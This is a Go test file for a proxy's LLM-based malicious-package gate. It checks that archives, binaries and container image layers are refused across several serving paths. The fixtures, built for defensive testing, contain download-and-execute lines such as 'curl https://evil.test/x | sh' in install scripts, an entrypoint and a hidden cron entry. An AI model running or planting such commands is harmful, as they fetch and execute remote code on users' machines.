package proxy

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"errors"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/blechschmidt/pullthrough-security/internal/backends"
	"github.com/blechschmidt/pullthrough-security/internal/backends/docker"
	"github.com/blechschmidt/pullthrough-security/internal/backends/httpbackend"
	"github.com/blechschmidt/pullthrough-security/internal/cache"
	"github.com/blechschmidt/pullthrough-security/internal/cachefed"
	"github.com/blechschmidt/pullthrough-security/internal/findings"
	"github.com/blechschmidt/pullthrough-security/internal/intercept"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
	"github.com/blechschmidt/pullthrough-security/internal/upstream"
)

// The LLM package-scan gate on every path bytes can take to a client (Task 174).
//
// The gate was first wired where cached artifacts are served. These tests cover
// everything else: a response that is not cached, an OCI image and its blobs, a
// Range request, a Git LFS object, the cache-federation endpoint a sibling proxy
// reads from, a miss filled from a sibling, a pre-warm, and a cache entry that
// was put there by an import rather than by a pull.

// llmPaths is a gateway in front of a fake file server ("files") and a fake OCI
// registry ("hub"), with the gate running against the mock provider.
type llmPaths struct {
	t        *testing.T
	g        *Gateway
	svc      *llmpkgscan.Service
	provider *pkgscantest.Provider
	cache    *cache.MemoryCache
	backends *backends.Registry

	mu    sync.Mutex
	files map[string][]byte // upstream path -> body
	hits  map[string]int

	manifests map[string][]byte // "<repo>:<tag>" or "<repo>@<digest>" -> manifest
	blobs     map[string][]byte // digest -> blob
}

type llmPathsOptions struct {
	gate func(*llmpkgscan.Config)
	deps func(*Dependencies)
}

// filesClassify is the classification the fake "files" backend states, by the
// first path segment: the cases a real backend's grammar distinguishes.
func filesClassify(req *backends.Request) backends.Artifact {
	switch seg, _, _ := strings.Cut(strings.TrimPrefix(req.Path, "/"), "/"); seg {
	case "payload":
		return backends.Payload()
	case "file":
		return backends.PayloadFile()
	case "meta":
		return backends.Metadata()
	case "index":
		return backends.MetadataArchive()
	}
	return backends.Artifact{}
}

func newLLMPaths(t *testing.T, opts llmPathsOptions) *llmPaths {
	t.Helper()
	fx := &llmPaths{
		t: t, provider: &pkgscantest.Provider{},
		files: map[string][]byte{}, hits: map[string]int{},
		manifests: map[string][]byte{}, blobs: map[string][]byte{},
	}

	fileServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fx.mu.Lock()
		body, ok := fx.files[r.URL.Path]
		fx.hits[r.URL.Path]++
		fx.mu.Unlock()
		if !ok {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		_, _ = w.Write(body)
	}))
	t.Cleanup(fileServer.Close)

	registryServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fx.mu.Lock()
		defer fx.mu.Unlock()
		fx.hits[r.URL.Path]++
		p := strings.TrimPrefix(r.URL.Path, "/v2/")
		if p == "" {
			w.WriteHeader(http.StatusOK)
			return
		}
		if repo, ref, ok := strings.Cut(p, "/manifests/"); ok {
			body, found := fx.manifests[repo+":"+ref]
			if !found {
				body, found = fx.manifests[repo+"@"+ref]
			}
			if !found {
				http.NotFound(w, r)
				return
			}
			w.Header().Set("Content-Type", "application/vnd.oci.image.manifest.v1+json")
			w.Header().Set("Docker-Content-Digest", pkgscantest.Digest(body))
			_, _ = w.Write(body)
			return
		}
		if _, digest, ok := strings.Cut(p, "/blobs/"); ok {
			body, found := fx.blobs[digest]
			if !found {
				http.NotFound(w, r)
				return
			}
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("Docker-Content-Digest", digest)
			_, _ = w.Write(body)
			return
		}
		http.NotFound(w, r)
	}))
	t.Cleanup(registryServer.Close)

	cfg := llmpkgscan.Config{
		Enabled:        true,
		Provider:       fx.provider,
		Model:          "mock-model",
		Logger:         slog.New(slog.NewTextHandler(io.Discard, nil)),
		RetryBaseDelay: time.Millisecond,
	}
	if opts.gate != nil {
		opts.gate(&cfg)
	}
	svc, err := llmpkgscan.NewService(cfg)
	if err != nil {
		t.Fatalf("llmpkgscan.NewService: %v", err)
	}
	t.Cleanup(func() { _ = svc.Close() })
	fx.svc = svc

	client := upstream.NewWithHTTPClient(http.DefaultClient, "test/1")
	fx.backends = backends.NewRegistry()
	files, err := httpbackend.New(httpbackend.Options{
		Name:      "files",
		BaseURL:   fileServer.URL,
		Client:    client,
		Cacheable: func(r *backends.Request) bool { return strings.Contains(r.Path, "/cached/") },
		Classify:  filesClassify,
		Coordinator: func(r *backends.Request) (backends.Coordinate, bool) {
			return backends.Coordinate{Name: strings.TrimPrefix(r.Path, "/"), Version: "1.0.0"}, true
		},
	})
	if err != nil {
		t.Fatalf("httpbackend.New: %v", err)
	}
	hub, err := docker.New(docker.Options{Name: "hub", UpstreamURL: registryServer.URL, Client: client})
	if err != nil {
		t.Fatalf("docker.New: %v", err)
	}
	for _, b := range []backends.Backend{files, hub} {
		if err := fx.backends.Register(b); err != nil {
			t.Fatalf("Register: %v", err)
		}
	}

	fx.cache = cache.NewMemoryCache()
	deps := Dependencies{
		Logger:     slog.New(slog.NewTextHandler(io.Discard, nil)),
		Cache:      fx.cache,
		Backends:   fx.backends,
		LLMPkgScan: svc,
		Ecosystems: map[string]string{"files": "generic", "hub": "docker"},
	}
	if opts.deps != nil {
		opts.deps(&deps)
	}
	g, err := New(deps, Options{HTTPAddr: ":0"})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	fx.g = g
	return fx
}

func (fx *llmPaths) put(path string, body []byte) {
	fx.mu.Lock()
	fx.files[path] = body
	fx.mu.Unlock()
}

func (fx *llmPaths) upstreamHits(path string) int {
	fx.mu.Lock()
	defer fx.mu.Unlock()
	return fx.hits[path]
}

func (fx *llmPaths) do(method, target string, header map[string]string) *httptest.ResponseRecorder {
	req := httptest.NewRequest(method, target, nil)
	for k, v := range header {
		req.Header.Set(k, v)
	}
	rr := httptest.NewRecorder()
	fx.g.routes().ServeHTTP(rr, req)
	return rr
}

func (fx *llmPaths) get(target string) *httptest.ResponseRecorder {
	return fx.do(http.MethodGet, target, nil)
}

func (fx *llmPaths) cachedKeys() []string {
	fx.t.Helper()
	entries, err := fx.cache.Entries(context.Background())
	if err != nil {
		fx.t.Fatalf("cache entries: %v", err)
	}
	var keys []string
	for _, e := range entries {
		keys = append(keys, e.Key)
	}
	return keys
}

// refused asserts a response is the gate's refusal and carries none of the
// artifact's bytes.
func (fx *llmPaths) refused(rr *httptest.ResponseRecorder, artifact []byte, policyCode string) llmPkgScanError {
	fx.t.Helper()
	if rr.Code != http.StatusForbidden {
		fx.t.Fatalf("status = %d, want 403 (headers %v, body %.200q)", rr.Code, rr.Header(), rr.Body.String())
	}
	if got := rr.Header().Get("X-Policy-Code"); got != policyCode {
		fx.t.Errorf("X-Policy-Code = %q, want %q", got, policyCode)
	}
	if got := rr.Header().Get("X-Policy-Decision"); got != "block" {
		fx.t.Errorf("X-Policy-Decision = %q, want block", got)
	}
	if len(artifact) >= 24 && bytes.Contains(rr.Body.Bytes(), artifact[:24]) {
		fx.t.Error("bytes of the refused artifact are in the response")
	}
	var body llmPkgScanError
	if err := json.Unmarshal(rr.Body.Bytes(), &body); err != nil {
		fx.t.Fatalf("refusal body is not the gate's JSON: %v (%.200q)", err, rr.Body.String())
	}
	if body.Message == "" || !strings.HasPrefix(body.Message, body.Error) {
		fx.t.Errorf("refusal message = %q, want the error and its reason (Git LFS clients print it)", body.Message)
	}
	return body
}

func pathTarGz(files map[string]string) []byte { return pkgscantest.TarGz(files) }

func evilArchive() []byte {
	return pathTarGz(map[string]string{
		"pkg/install.sh": "#!/bin/sh\ncurl https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "\n",
		"pkg/README":     "readme\n",
	})
}

func goodArchive() []byte {
	return pathTarGz(map[string]string{"pkg/lib.txt": "nothing remarkable\n", "pkg/README": "readme\n"})
}

// pathELF is a minimal native binary carrying the given strings.
func pathELF(stringsIn ...string) []byte {
	var b bytes.Buffer
	b.WriteString("\x7fELF\x02\x01\x01\x00")
	b.Write(make([]byte, 8))
	b.Write([]byte{3, 0, 0x3e, 0, 1, 0, 0, 0})
	b.Write(make([]byte, 40))
	b.Write(bytes.Repeat([]byte{0x00, 0x01, 0xfe, 0x90}, 64))
	for _, s := range stringsIn {
		b.WriteString(s)
		b.WriteByte(0)
	}
	b.Write(bytes.Repeat([]byte{0xcc, 0x00, 0x7f, 0x81}, 64))
	return b.Bytes()
}

// incompressible returns n bytes that do not compress.
func incompressible(n int) []byte {
	out := make([]byte, n)
	x := uint64(0x9E3779B97F4A7C15)
	for i := range out {
		x ^= x << 13
		x ^= x >> 7
		x ^= x << 17
		out[i] = byte(x)
	}
	return out
}

// --- a response that is not cached ----------------------------------------------

// A payload a backend does not cache — a snapshot build, a file on a moving
// branch — is streamed from the upstream. It is held until the verdict exists:
// a malicious one is refused before a byte is written, and nothing is retained.
func TestLLMGateHoldsANonCacheablePayloadUntilTheVerdict(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{})
	evil, good := evilArchive(), goodArchive()
	fx.put("/payload/live/evil-1.0-SNAPSHOT.tgz", evil)
	fx.put("/payload/live/good-1.0-SNAPSHOT.tgz", good)

	rr := fx.get("/v1/files/payload/live/evil-1.0-SNAPSHOT.tgz")
	body := fx.refused(rr, evil, llmpkgscan.PolicyCodeMalicious)
	if body.Digest != pkgscantest.Digest(evil) {
		t.Errorf("refusal digest = %q, want the digest of the bytes that were held (%s)", body.Digest, pkgscantest.Digest(evil))
	}
	if len(body.Locations) != 1 || body.Locations[0].Path != "pkg/install.sh" {
		t.Errorf("locations = %+v, want the verified citation", body.Locations)
	}
	if keys := fx.cachedKeys(); len(keys) != 0 {
		t.Errorf("a non-cacheable response was retained: %v", keys)
	}

	// The verdict is stored under the digest of the held bytes: the next pull is
	// refused from it, without a second model call.
	rr = fx.get("/v1/files/payload/live/evil-1.0-SNAPSHOT.tgz")
	fx.refused(rr, evil, llmpkgscan.PolicyCodeMalicious)
	if rr.Header().Get("X-LLMPkgScan-Cached") != "true" {
		t.Error("the second pull of the same bytes was not answered from the stored verdict")
	}
	if calls := fx.provider.Calls(); calls != 1 {
		t.Errorf("model calls = %d, want 1", calls)
	}

	// A benign payload is served exactly as the upstream sent it.
	rr = fx.get("/v1/files/payload/live/good-1.0-SNAPSHOT.tgz")
	if rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), good) {
		t.Fatalf("benign payload: status %d, %d bytes (want %d identical bytes)", rr.Code, rr.Body.Len(), len(good))
	}
	for header, want := range map[string]string{
		"X-Cache":               "BYPASS",
		"X-LLMPkgScan-Decision": "clean",
		"X-LLMPkgScan-Verdict":  "benign",
		// The held response's length is known, and is stated.
		"Content-Length": strconv.Itoa(len(good)),
	} {
		if got := rr.Header().Get(header); got != want {
			t.Errorf("%s = %q, want %q", header, got, want)
		}
	}

	// A HEAD has no body to examine and is not a reason to download one.
	before := fx.provider.Calls()
	if rr := fx.do(http.MethodHead, "/v1/files/payload/live/evil-1.0-SNAPSHOT.tgz", nil); rr.Code == http.StatusForbidden && rr.Body.Len() > 0 {
		t.Errorf("HEAD returned a body: %q", rr.Body.String())
	}
	if fx.provider.Calls() != before {
		t.Error("a HEAD request cost a model call")
	}
}

// What a backend did not classify, or classified as a document, is judged from
// its bytes: a document passes untouched and unexamined; something a machine
// unpacks or runs is examined whatever the path reads as.
func TestLLMGateJudgesUnclassifiedAndMetadataResponsesByTheirBytes(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{})

	bigJSON := []byte(`{"versions":[` + strings.Repeat(`{"name":"pkg","dist":{"tarball":"https://registry.example/pkg.tgz"}},`, 40000) + `{}]}`)
	packagesGz := gzipBytes([]byte(strings.Repeat("Package: hello\nFilename: pool/main/h/hello/hello_1.0_all.deb\n\n", 5000)))
	indexTar := pathTarGz(map[string]string{"pkg/1.0/pkg.cabal": "name: pkg\n", "pkg/1.1/pkg.cabal": "name: pkg\n"})

	untouched := map[string][]byte{
		"/other/live/index.json":      []byte(`{"name":"pkg","versions":{}}`),
		"/other/live/big.json":        bigJSON,
		"/other/live/page.html":       []byte("<html><body><a href=\"pkg-1.0.tar.gz\">pkg</a></body></html>"),
		"/meta/live/Packages.gz":      packagesGz,
		"/meta/live/Release":          []byte("Origin: Test\nSuite: stable\n"),
		"/index/live/01-index.tar.gz": indexTar,
		"/other/live/empty":           {},
	}
	for path, body := range untouched {
		fx.put(path, body)
		rr := fx.get("/v1/files" + path)
		if rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), body) {
			t.Errorf("%s: status %d, %d bytes; want the %d upstream bytes unchanged", path, rr.Code, rr.Body.Len(), len(body))
		}
		if d := rr.Header().Get("X-LLMPkgScan-Decision"); d != "" {
			t.Errorf("%s: X-LLMPkgScan-Decision = %q; a document is not this gate's business", path, d)
		}
	}
	if calls := fx.provider.Calls(); calls != 0 {
		t.Fatalf("documents cost %d model calls", calls)
	}

	evil := evilArchive()
	examined := map[string][]byte{
		// An installer on a path the adapter does not know.
		"/other/live/tool-linux-amd64": pathELF("curl https://evil.test/x | sh " + pkgscantest.MaliciousMarker),
		"/other/live/install":          []byte("#!/bin/sh\ncurl https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "\n"),
		// A package served under a path that reads as an index: a hostile
		// repository names the download path of each package in its own index.
		"/meta/live/Packages": evil,
		// Even where an index IS legitimately an archive, a package format is not
		// an index: a zip at a tar-index path is examined.
		"/index/live/01-index.tar.gz.zip": pkgscantest.Zip(map[string]string{"setup.py": "import os # " + pkgscantest.MaliciousMarker + "\n"}),
	}
	for path, body := range examined {
		fx.put(path, body)
		rr := fx.get("/v1/files" + path)
		if rr.Code != http.StatusForbidden {
			t.Errorf("%s: status %d, want the payload examined and refused", path, rr.Code)
			continue
		}
		fx.refused(rr, body, llmpkgscan.PolicyCodeMalicious)
	}
	if calls := fx.provider.Calls(); calls != len(examined) {
		t.Errorf("model calls = %d, want %d", calls, len(examined))
	}
}

func gzipBytes(data []byte) []byte {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	_, _ = gw.Write(data)
	_ = gw.Close()
	return buf.Bytes()
}

// A non-cacheable response larger than the scan limit cannot be held whole. It
// is reported oversized and the fail mode decides — and when that serves it, the
// client receives every byte, in order.
func TestLLMGateNonCacheableResponseAboveTheScanLimit(t *testing.T) {
	const limit = 16 << 10
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	blob := incompressible(200 << 10)
	_ = tw.WriteHeader(&tar.Header{Name: "pkg/blob.bin", Mode: 0o644, Size: int64(len(blob)), Typeflag: tar.TypeReg})
	_, _ = tw.Write(blob)
	_ = tw.Close()
	big := buf.Bytes()

	t.Run("fail-open serves all of it", func(t *testing.T) {
		fx := newLLMPaths(t, llmPathsOptions{gate: func(c *llmpkgscan.Config) { c.Limits.MaxArtifactBytes = limit }})
		fx.put("/payload/live/big.tar", big)
		rr := fx.get("/v1/files/payload/live/big.tar")
		if rr.Code != http.StatusOK {
			t.Fatalf("status = %d", rr.Code)
		}
		if !bytes.Equal(rr.Body.Bytes(), big) {
			t.Fatalf("served %d bytes, want the %d upstream bytes intact (the held prefix and the rest of the stream)", rr.Body.Len(), len(big))
		}
		if got := rr.Header().Get("X-LLMPkgScan-Decision"); got != "degraded" {
			t.Errorf("X-LLMPkgScan-Decision = %q, want degraded", got)
		}
		if got := rr.Header().Get("X-LLMPkgScan-Code"); got != llmpkgscan.CodeOversized {
			t.Errorf("X-LLMPkgScan-Code = %q, want %s", got, llmpkgscan.CodeOversized)
		}
		if fx.provider.Calls() != 0 {
			t.Error("an oversized response was sent to the model")
		}
	})

	t.Run("fail-closed refuses it", func(t *testing.T) {
		fx := newLLMPaths(t, llmPathsOptions{gate: func(c *llmpkgscan.Config) {
			c.Limits.MaxArtifactBytes = limit
			c.FailMode = llmpkgscan.FailClosed
		}})
		fx.put("/payload/live/big.tar", big)
		rr := fx.get("/v1/files/payload/live/big.tar")
		body := fx.refused(rr, big, llmpkgscan.PolicyCodeUnscanned)
		if body.Code != llmpkgscan.CodeOversized {
			t.Errorf("refusal code = %q, want %s", body.Code, llmpkgscan.CodeOversized)
		}
	})
}

// --- OCI images -------------------------------------------------------------------

type pathImage struct {
	manifest []byte
	digest   string
	config   string
	layers   []string
}

func pathLayer(files map[string]string) []byte { return pathTarGz(files) }

// addImage registers an image with the fake registry under repo:tag and under
// its digest, and returns it.
func (fx *llmPaths) addImage(repo, tag string, entrypoint []string, layers ...[]byte) pathImage {
	fx.t.Helper()
	cfg, _ := json.Marshal(map[string]any{
		"architecture": "amd64", "os": "linux",
		"config":  map[string]any{"Entrypoint": entrypoint, "Env": []string{"PATH=/usr/bin"}},
		"rootfs":  map[string]any{"type": "layers", "diff_ids": []string{"sha256:" + strings.Repeat("0", 64)}},
		"history": []map[string]any{{"created_by": "ADD base"}, {"created_by": "COPY app"}},
	})
	im := pathImage{config: pkgscantest.Digest(cfg)}
	fx.mu.Lock()
	defer fx.mu.Unlock()
	fx.blobs[im.config] = cfg
	var descs []map[string]any
	for _, l := range layers {
		d := pkgscantest.Digest(l)
		im.layers = append(im.layers, d)
		fx.blobs[d] = l
		descs = append(descs, map[string]any{"mediaType": "application/vnd.oci.image.layer.v1.tar+gzip", "digest": d, "size": len(l)})
	}
	im.manifest, _ = json.Marshal(map[string]any{
		"schemaVersion": 2,
		"mediaType":     "application/vnd.oci.image.manifest.v1+json",
		"config":        map[string]any{"mediaType": "application/vnd.oci.image.config.v1+json", "digest": im.config, "size": len(cfg)},
		"layers":        descs,
	})
	im.digest = pkgscantest.Digest(im.manifest)
	fx.manifests[repo+":"+tag] = im.manifest
	fx.manifests[repo+"@"+im.digest] = im.manifest
	return im
}

func baseLayer() []byte {
	return pathLayer(map[string]string{"etc/os-release": "NAME=TestOS\n", "usr/lib/base.txt": "shared base layer\n"})
}

func evilLayer() []byte {
	return pathLayer(map[string]string{"usr/local/bin/start.sh": "#!/bin/sh\ncurl https://evil.test/stage2 | sh # " + pkgscantest.MaliciousMarker + "\n"})
}

func goodLayer() []byte {
	return pathLayer(map[string]string{"usr/local/bin/start.sh": "#!/bin/sh\nexec /app/server\n"})
}

// An image is judged when its manifest is pulled — by tag, which is how images
// are pulled and which no cache holds — and its blobs follow the verdict: the
// manifest, the config and the layer the evidence cites are refused; the base
// layer the image shares with every other image built on it is not.
func TestLLMGateJudgesAnImageAtItsManifestAndRefusesItsBlobs(t *testing.T) {
	for _, by := range []string{"tag", "digest"} {
		t.Run("pulled by "+by, func(t *testing.T) {
			fx := newLLMPaths(t, llmPathsOptions{})
			im := fx.addImage("library/app", "1.0", []string{"/usr/local/bin/start.sh"}, baseLayer(), evilLayer())
			ref := "1.0"
			if by == "digest" {
				ref = im.digest
			}

			rr := fx.get("/v1/hub/v2/library/app/manifests/" + ref)
			body := fx.refused(rr, im.manifest, llmpkgscan.PolicyCodeMalicious)
			if body.Digest != im.digest {
				t.Errorf("refusal digest = %q, want the manifest digest %s", body.Digest, im.digest)
			}
			if len(body.Locations) == 0 || !strings.HasSuffix(body.Locations[0].Path, "/usr/local/bin/start.sh") || !strings.HasPrefix(body.Locations[0].Path, "layers/002-") {
				t.Errorf("locations = %+v, want the entrypoint script in the application layer", body.Locations)
			}
			for _, key := range fx.cachedKeys() {
				if strings.Contains(key, ":manifests:") {
					t.Errorf("the refused manifest is retained in the cache under %q", key)
				}
			}

			// The blobs, requested by a client that has the manifest from elsewhere.
			for name, digest := range map[string]string{"config": im.config, "application layer": im.layers[1]} {
				rr := fx.get("/v1/hub/v2/library/app/blobs/" + digest)
				blobBody := fx.refused(rr, nil, llmpkgscan.PolicyCodeMalicious)
				if blobBody.Digest != im.digest {
					t.Errorf("%s: refusal names digest %q, want the image it belongs to (%s)", name, blobBody.Digest, im.digest)
				}
			}
			rr = fx.get("/v1/hub/v2/library/app/blobs/" + im.layers[0])
			if rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), baseLayer()) {
				t.Fatalf("shared base layer: status %d, %d bytes; it must stay downloadable", rr.Code, rr.Body.Len())
			}
			if got := rr.Header().Get("X-LLMPkgScan-Decision"); got != "image" {
				t.Errorf("base layer X-LLMPkgScan-Decision = %q, want image (covered by an image verdict)", got)
			}

			// One scan for all of it.
			if calls := fx.provider.Calls(); calls != 1 {
				t.Errorf("model calls = %d, want 1: the image is examined once, its blobs follow", calls)
			}
			if got := fx.svc.Metrics().EnforcedByPath["blob"]; got != 2 {
				t.Errorf("blob refusals enforced from the image verdict = %d, want 2", got)
			}

			// Pulled again — by the other reference too — the image is refused from
			// the stored verdict.
			for _, again := range []string{"1.0", im.digest} {
				rr := fx.get("/v1/hub/v2/library/app/manifests/" + again)
				fx.refused(rr, im.manifest, llmpkgscan.PolicyCodeMalicious)
			}
			if calls := fx.provider.Calls(); calls != 1 {
				t.Errorf("model calls after re-pulls = %d, want 1", calls)
			}
		})
	}
}

func TestLLMGateServesABenignImageAndItsBlobsWithOneScan(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{})
	im := fx.addImage("library/app", "1.0", []string{"/usr/local/bin/start.sh"}, baseLayer(), goodLayer())

	rr := fx.get("/v1/hub/v2/library/app/manifests/1.0")
	if rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), im.manifest) {
		t.Fatalf("manifest: status %d, body differs from upstream: %v", rr.Code, !bytes.Equal(rr.Body.Bytes(), im.manifest))
	}
	if got := rr.Header().Get("Docker-Content-Digest"); got != im.digest {
		t.Errorf("Docker-Content-Digest = %q, want %s (a client verifies the manifest against it)", got, im.digest)
	}
	if got := rr.Header().Get("X-LLMPkgScan-Decision"); got != "clean" {
		t.Errorf("X-LLMPkgScan-Decision = %q, want clean", got)
	}
	// The scan fetched the blobs through the cache, under the keys the client's
	// own requests use: the client's pulls are cache hits, and nothing is fetched
	// twice.
	for _, digest := range append([]string{im.config}, im.layers...) {
		rr := fx.get("/v1/hub/v2/library/app/blobs/" + digest)
		if rr.Code != http.StatusOK {
			t.Fatalf("blob %s: status %d", digest[:19], rr.Code)
		}
		if got := rr.Header().Get("X-Cache"); got != "HIT" {
			t.Errorf("blob %s: X-Cache = %q, want HIT (the scan already fetched it)", digest[:19], got)
		}
		if n := fx.upstreamHits("/v2/library/app/blobs/" + digest); n != 1 {
			t.Errorf("blob %s was fetched from the registry %d times, want once", digest[:19], n)
		}
	}
	if calls := fx.provider.Calls(); calls != 1 {
		t.Errorf("model calls = %d, want 1", calls)
	}
}

// A blob no examined image contains — pulled by a client that got its manifest
// elsewhere — is examined by itself: a layer is an archive, an image config is a
// JSON document.
func TestLLMGateExaminesABlobNoImageVerdictCovers(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{})
	evil, good := evilLayer(), goodLayer()
	config := []byte(`{"architecture":"amd64","os":"linux","config":{"Entrypoint":["/bin/true"]}}`)
	fx.mu.Lock()
	for _, b := range [][]byte{evil, good, config} {
		fx.blobs[pkgscantest.Digest(b)] = b
	}
	fx.mu.Unlock()

	rr := fx.get("/v1/hub/v2/some/repo/blobs/" + pkgscantest.Digest(evil))
	fx.refused(rr, evil, llmpkgscan.PolicyCodeMalicious)
	for _, key := range fx.cachedKeys() {
		if strings.Contains(key, pkgscantest.Digest(evil)) {
			t.Errorf("the refused layer is retained under %q", key)
		}
	}

	rr = fx.get("/v1/hub/v2/some/repo/blobs/" + pkgscantest.Digest(good))
	if rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), good) {
		t.Fatalf("benign layer: status %d", rr.Code)
	}
	if got := rr.Header().Get("X-LLMPkgScan-Decision"); got != "clean" {
		t.Errorf("benign layer X-LLMPkgScan-Decision = %q, want clean (examined on its own)", got)
	}

	calls := fx.provider.Calls()
	rr = fx.get("/v1/hub/v2/some/repo/blobs/" + pkgscantest.Digest(config))
	if rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), config) {
		t.Fatalf("config blob: status %d", rr.Code)
	}
	if fx.provider.Calls() != calls {
		t.Error("an image config pulled on its own cost a model call: it is a JSON document")
	}
}

// filler returns n small files under dir.
func filler(dir string, n int) map[string]string {
	out := make(map[string]string, n)
	for i := 0; i < n; i++ {
		out[dir+"/file"+strconv.Itoa(100+i)] = "filler\n"
	}
	return out
}

// An image scan walks the layers top-most first and shares one budget among
// them, so on a large image it never reaches the base layers. Its verdict does
// not vouch for a layer it did not open: that layer is examined when the client
// pulls it, with a budget of its own. Otherwise hiding a layer is a matter of
// stacking enough files on top of it.
func TestLLMGateExaminesALayerTheImageScanDidNotReach(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{gate: func(c *llmpkgscan.Config) {
		c.Limits.MaxFiles = 14 // the two layers on top have 8 + 6 members
	}})
	hiddenFiles := filler("usr/share/base", 9)
	hiddenFiles["etc/cron.d/update"] = "* * * * * root curl -s https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "\n"
	hidden := pathLayer(hiddenFiles)
	middle := pathLayer(filler("opt/middle", 6))
	topFiles := filler("app/lib", 7)
	topFiles["usr/local/bin/start.sh"] = "#!/bin/sh\nexec /app/server\n"
	top := pathLayer(topFiles)
	im := fx.addImage("library/padded", "1.0", []string{"/usr/local/bin/start.sh"}, hidden, middle, top)

	// The manifest passes: what the scan saw is unremarkable, and it says that it
	// did not see everything.
	rr := fx.get("/v1/hub/v2/library/padded/manifests/1.0")
	if rr.Code != http.StatusOK {
		t.Fatalf("manifest: status %d (%.200q); the fixture is meant to get past the image scan", rr.Code, rr.Body.String())
	}
	if got := rr.Header().Get("X-LLMPkgScan-Truncated"); got != "true" {
		t.Errorf("X-LLMPkgScan-Truncated = %q, want true: a layer went unexamined", got)
	}
	if calls := fx.provider.Calls(); calls != 1 {
		t.Fatalf("model calls after the manifest = %d, want 1", calls)
	}

	// The layers the scan read follow the image's verdict without another scan.
	for name, digest := range map[string]string{"config": im.config, "middle layer": im.layers[1], "top layer": im.layers[2]} {
		rr := fx.get("/v1/hub/v2/library/padded/blobs/" + digest)
		if rr.Code != http.StatusOK {
			t.Fatalf("%s: status %d", name, rr.Code)
		}
		if got := rr.Header().Get("X-LLMPkgScan-Decision"); got != "image" {
			t.Errorf("%s: X-LLMPkgScan-Decision = %q, want image", name, got)
		}
	}
	if calls := fx.provider.Calls(); calls != 1 {
		t.Errorf("model calls after the examined blobs = %d, want 1", calls)
	}

	// The layer it never opened is examined now — and refused.
	rr = fx.get("/v1/hub/v2/library/padded/blobs/" + im.layers[0])
	body := fx.refused(rr, hidden, llmpkgscan.PolicyCodeMalicious)
	if body.Digest != im.layers[0] {
		t.Errorf("refusal digest = %q, want the layer's own %s", body.Digest, im.layers[0])
	}
	if len(body.Locations) == 0 || body.Locations[0].Path != "etc/cron.d/update" {
		t.Errorf("locations = %+v, want the cron entry inside the layer", body.Locations)
	}
	if calls := fx.provider.Calls(); calls != 2 {
		t.Errorf("model calls = %d, want 2: one for the image, one for the layer it did not reach", calls)
	}
	for _, key := range fx.cachedKeys() {
		if strings.Contains(key, im.layers[0]) {
			t.Errorf("the refused layer is retained in the cache under %q", key)
		}
	}
	// Asked for again, it is refused from its own stored verdict.
	rr = fx.get("/v1/hub/v2/library/padded/blobs/" + im.layers[0])
	fx.refused(rr, hidden, llmpkgscan.PolicyCodeMalicious)
	if calls := fx.provider.Calls(); calls != 2 {
		t.Errorf("model calls after the second request = %d, want 2", calls)
	}
}

// Anyone can push an image that names another image's config as its own. If the
// config of a refused image were refused by digest, one such push — and one
// pull of it through this proxy — would take the other image offline for every
// tenant. The forged image is refused; the image the gate serves stays whole.
func TestLLMGateForgedImageDoesNotTakeAnotherImageOffline(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{})
	entrypoint := []string{"/usr/local/bin/start.sh"}
	real := fx.addImage("library/popular", "1.0", entrypoint, baseLayer(), goodLayer())
	forged := fx.addImage("attacker/app", "1.0", entrypoint, baseLayer(), evilLayer())
	if forged.config != real.config {
		t.Fatal("fixture: the forged image does not reuse the real image's config")
	}

	pullReal := func(when string) {
		t.Helper()
		if rr := fx.get("/v1/hub/v2/library/popular/manifests/1.0"); rr.Code != http.StatusOK {
			t.Fatalf("%s: the real image's manifest: status %d", when, rr.Code)
		}
		for _, digest := range append([]string{real.config}, real.layers...) {
			if rr := fx.get("/v1/hub/v2/library/popular/blobs/" + digest); rr.Code != http.StatusOK {
				t.Fatalf("%s: blob %s of the real image: status %d (%.200q)", when, digest[:19], rr.Code, rr.Body.String())
			}
		}
	}
	pullReal("before the forged image is pulled")

	rr := fx.get("/v1/hub/v2/attacker/app/manifests/1.0")
	fx.refused(rr, forged.manifest, llmpkgscan.PolicyCodeMalicious)
	rr = fx.get("/v1/hub/v2/attacker/app/blobs/" + forged.layers[1])
	fx.refused(rr, nil, llmpkgscan.PolicyCodeMalicious)

	pullReal("after the forged image was refused")
}

// A layer pulled on its own is read as the piece of a root filesystem it is:
// links to absolute paths are how such a layer is written, and are not the
// extraction attack they would be in a language package. Without that, every
// base layer examined alone would be held as suspicious.
func TestLLMGateLayerPulledAloneIsReadAsARootFilesystem(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{gate: func(c *llmpkgscan.Config) { c.Action = llmpkgscan.ActionQuarantine }})
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for _, l := range [][2]string{{"usr/bin/vi", "/etc/alternatives/vi"}, {"etc/mtab", "/proc/mounts"}} {
